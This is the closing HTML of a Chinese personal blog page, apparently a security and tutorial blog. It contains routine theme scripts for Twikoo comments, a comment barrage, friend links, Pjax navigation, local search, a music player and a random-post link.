        if (true) utils.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
        else loadTwikoo()
    } else {
        window.loadTwoComment = loadTwikoo
    }
})()
</script><script>async function barrageTwikoo() {
    await fetch("https://twikoo.w0xking.us.kg/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            event: "COMMENT_GET",
            accessToken: "",
            url: window.location.pathname
        })
    }).then(async res => {
        if (!res.ok) throw new Error("HTTP error! status: " + res.status)
        const data = await res.json();
        const init = () => {
            initializeCommentBarrage((data.data).map(item => Object.assign({
                content: item.comment,
                nick: item.nick,
                mailMd5: item.mailMd5,
                id: item.id
            })))
        }
        if (typeof initializeCommentBarrage === "undefined") await utils.getScript('/js/third_party/barrage.min.js?v=2.1.12').then(init)
        else init()
    }).catch(error => console.error("An error occurred while fetching comments: ", error))
}</script></div></div><script>const links = [{"name":"0xking","link":"https://w0xking.github.io/"},{"name":"isYangs","link":"https://isyangs.cn"},{"name":"张洪Heo","link":"https://blog.zhheo.com/"},{"name":"唐志远","link":"https://fe32.top/"},{"name":"安知鱼","link":"https://blog.anheyu.com/"},{"name":"Fomalhaut🥝","link":"https://www.fomal.cc/"},{"name":"刘旭辉","link":"https://akilar.top/"},{"name":"御网尚书的小宇宙","link":"https://www.siteweb.cn/"},{"name":"SaDuck","link":"https://www.saduck.top"},{"name":"颍川","link":"https://www.yingchuan.us.kg/"}]
const randomText = '点击前往按钮进入随机一个友链，不保证跳转网站的安全性和可用性。本次随机到的是本站友链：⌈ ${name} ⌋'
function travelling() {
    const link = links[utils.randomNum(links.length)];
    Snackbar.show({
        text: randomText.replace(/\$\{name}/,link.name),
        duration: 8000,
        pos: 'top-center',
        actionText: '前往',
        onActionClick: function(element) {
            element.style.opacity = 0;
            window.open(link.link, '_blank');
        }
    });
}
</script><script>function randomLinksList() {
    const linkcard = document.getElementById('friend-links-in-footer');
    if (linkcard == null) return;

    let data = '';
    let linksCopy = [...links];
    let count = Math.min(3, linksCopy.length);

    for (let i = 0; i < count; i++) {
        let index = utils.randomNum(linksCopy.length);
        const {link, name} = linksCopy[index];
        data += `<a class="footer-item" href="${link}" target="_blank" rel="noopener noreferrer nofollow">${name}</a>`;
        linksCopy.splice(index, 1);
    }

    linkcard.innerHTML = data + '<a class="footer-item" href="/links/">更多</a>';
}</script><!-- pjax--><script>const pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: ["title","#body-wrap","#site-config","meta[name=\"description\"]",".js-pjax","meta[property^=\"og:\"]","#config-diff",".rs_show",".rs_hide"],
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
})

document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
})

document.addEventListener('pjax:complete', () => {
    window.refreshFn()

    document.querySelectorAll('script[data-pjax]').forEach(item => {
        const newScript = document.createElement('script')
        const content = item.text || item.textContent || item.innerHTML || ""
        Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
        newScript.appendChild(document.createTextNode(content))
        item.parentNode.replaceChild(newScript, item)
    })

    GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

})

document.addEventListener('pjax:error', (e) => {
    if (e.request.status === 404) {
        pjax.loadUrl('/404.html')
    }
})</script><!-- google adsense--><!-- search--><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="solitude fa-solid fa-xmark"></i></button></nav><div class="search-wrap"><div class="search-box"><input class="search-box-input" id="search-input" type="text" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off" placeholder="输入关键词快速查找"></div><div id="search-results"><div id="search-hits"><a class="tag-list" href="javascript:void(0);" onclick="pjax.loadUrl('/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/')">网络安全</a><a class="tag-list" href="javascript:void(0);" onclick="pjax.loadUrl('/tags/%E6%95%99%E7%A8%8B/')">教程</a></div></div><div id="search-pagination"></div><div id="search-tips"></div></div></div><div id="search-mask"></div></div><script src="/js/search/local.js?v=2.1.12"></script><!-- Tianli-Talk--><!-- music--><div class="needEndHide" id="nav-music"><div id="nav-music-hoverTips" onclick="sco.musicToggle()">音乐已暂停</div><meting-js id="8407304077" server="netease" type="playlist" mutex="true" preload="none" theme="var(--efu-main)" data-lrctype="0" order="random" volume="0.8"></meting-js></div></body></html>
        <script>
            const posts = ["posts/8fa9.html","posts/ip.html","posts/4340.html","posts/3eeb.html","posts/d2d7725.html","posts/8f9926b7.html","posts/41767f46.html","posts/af9e54a7.html","posts/c636442c.html","posts/b01882d5.html","posts/da81a947.html","posts/494f7a99.html","posts/8e6daf7b.html","posts/e7654e82.html","posts/b85a533c.html","posts/e9f0bb2c.html","posts/548d9c19.html","posts/dc8d366.html","posts/cb557a52.html","posts/417e2c66.html","posts/dabe8c2.html","posts/5372cc32.html","posts/4ea940d2.html","posts/f0a4488f.html"];
            function toRandomPost() {
                const randomPost = posts[Math.floor(Math.random() * posts.length)];
                pjax.loadUrl(GLOBAL_CONFIG.root + randomPost);
            }
        </script>